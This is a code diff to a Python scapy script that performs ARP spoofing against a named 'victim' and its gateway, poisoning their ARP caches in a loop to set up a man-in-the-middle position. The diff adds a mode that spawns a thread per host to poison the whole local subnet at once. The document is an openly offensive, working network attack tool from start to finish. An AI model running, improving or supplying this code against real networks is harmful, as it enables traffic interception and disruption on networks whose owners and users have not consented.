@@ -1,16 +1,11 @@
 import optparse
 import ipaddress
-import netifaces
-from termcolor import colored
+from network import * 
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
-
-
-INFO = lambda x :  colored('[+] ' + x, 'green')
-DANGER = lambda x : colored('[!] ' + x, 'red') 
-BLUE = lambda x : colored(x , 'blue')
-victim_alive = False
+import threading
+import ipaddress as ipad
 
 def restore(DestinationIP, SourceIP):
 	DestinationMAC = getmac(DestinationIP)
@@ -18,39 +13,11 @@ def restore(DestinationIP, SourceIP):
 	packet = ARP(op=2, pdst=DestinationIP, hwdst=DestinationMAC, psrc=SourceIP, hwsrc=SourceMAC)
 	send(packet, count=6, verbose=False)
 
-def getmac(ip):
-	arp_request = ARP(pdst=ip)
-	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-	arp_request_broadcast = broadcast/arp_request
-	try : 
-		answered_list = srp(arp_request_broadcast, timeout=1,
-								verbose=False)[0]
-		return answered_list[0][1].hwsrc
-	except IndexError :
-		print(DANGER("Coudn't find the Mac address .. Exit"))
-		exit(0) 
 
 def ArpSpoof(mac ,victim, spoof):
 	packet = ARP(op=2, pdst=victim, hwdst=mac, psrc=spoof)
 	send(packet, verbose=False)
 
-def alive() : 
-	global victim_alive 
-	victim_alive = True
-
-def check_connection(victim) :  
-	ans, unans = sr(IP(dst=victim)/ICMP() , verbose=0 , timeout = 2)
-	f = lambda s,r : alive()
-	ans.summary( f)
-	if victim_alive : 
-		print(INFO(victim + " is alive"))
-	else : 
-		print(INFO(victim+ " is not alive"))
-
-def gateway() : 
-	gws = netifaces.gateways()
-	ip_default_getway = gws['default'][netifaces.AF_INET][0]
-	return ip_default_getway
 
 def main():
 	parser = optparse.OptionParser(
@@ -61,49 +28,67 @@ def main():
 					  help='specify a spoof IP or a pretend IP, usually the gateway of the network)')
 	parser.add_option('-c', '--check', action="store_true", default=False,
 					  help='check connectivity of the victim , by default is False')
+	parser.add_option('-n', '--network', action="store_true", default=False,
+					  help='define the target as a network')
 	parser.add_option('-v', '--verbose', action="store_false", default=True,
 					  help='set verbose to False')
 	options , args  = parser.parse_args()
 	victim = options.victim
 	spoof = options.spoof
-	number_packets = 0
+	net = options.network
 	verbose = options.verbose
-	if (options.victim == None):
+	check = options.check
+	if victim : victim = victim.strip()
+
+
+	if (options.victim == None and net == None):
 		parser.print_help()
 		return 0
 	if (options.spoof == None):
-		if verbose : print(INFO("default ip spoof : ") , end="")
+		if verbose : print(INFO("default ip spoof : ") , end="" , flush=True)
 		spoof = gateway()
-		if verbose : print(BLUE(spoof))
-	if victim : victim = victim.strip()
-	if spoof != None  :  spoof = spoof.strip()
-	check = options.check
-	try : 
-		ip_spoof = ipaddress.ip_address(spoof)
-		ip_victim = ipaddress.ip_address(victim)
-	except ValueError as e: 
-		if verbose :  print(DANGER("Error in IP format"))
-		return 0
-	if check : 
-		check_connection(victim)
-	try:
-		mac_victim = getmac(victim) 
-		mac_spoof = getmac(spoof) 
-		if verbose : 
-			print(INFO("Victim MAC : " + mac_victim))
-			print(INFO("Spoof MAC  : " + mac_spoof))
-		print(INFO("Spoof starting ... ") , end="")
-		while True:
-			ArpSpoof( mac_victim , victim, spoof)
-			ArpSpoof(mac_spoof ,spoof, victim)
-			number_packets += 2
-			if verbose : print("\r" + INFO("Packets sent: " + str(number_packets)), end="")
-			time.sleep(3)
-	except KeyboardInterrupt :
-		restore(victim  , spoof)
-		restore(spoof , victim)
-		if verbose : print(INFO("Goodbye"))
-		return 0
+		if verbose : print(BLUE(spoof) , flush=True)
+	start(victim , spoof , net  , verbose , check)
+
+def start(victim , spoof , net , verbose , check) : 
+	if net :
+		try : 
+			inet , addr , mask , bd = getnetwork()
+			netw = ipad.IPv4Network(addr + '/' + mask , strict=False)
+			for ip in netw.hosts() : 
+				if ip == addr : continue
+				x = threading.Thread(target=start , args=(str(ip) , spoof , False , verbose , check))
+				x.start()
+		except KeyboardInterrupt : 
+			if verbose : print("\n" + INFO("Goodbye") , flush=True)
+			exit(0)	
+	elif net==False  : 
+		try:
+			ip_spoof = ipaddress.ip_address(spoof)
+			ip_victim = ipaddress.ip_address(victim)
+			if check : 
+				if not  check_connection(victim) : 
+					exit(0)
+			mac_victim = getmac(victim) 
+			mac_spoof = getmac(spoof) 
+			if mac_spoof  == False or mac_victim == False : 
+				exit(0)
+			while True : 
+				N = 0
+				ArpSpoof( mac_victim , victim, spoof)
+				ArpSpoof(mac_spoof ,spoof, victim)
+				N += 2
+				time.sleep(100)
+		except ValueError : 
+			if verbose :  print(DANGER("Error in IP format") , flush=True)
+			exit(0)
+		except KeyboardInterrupt :
+			restore(victim  , spoof)
+			restore(spoof , victim)
+			if verbose : print("\n" + INFO("Goodbye") , flush=True)
+			exit(0)
+		except Exception as e : 
+			print(e , flush=True)
 		
 if __name__ == "__main__" : 
 	main()
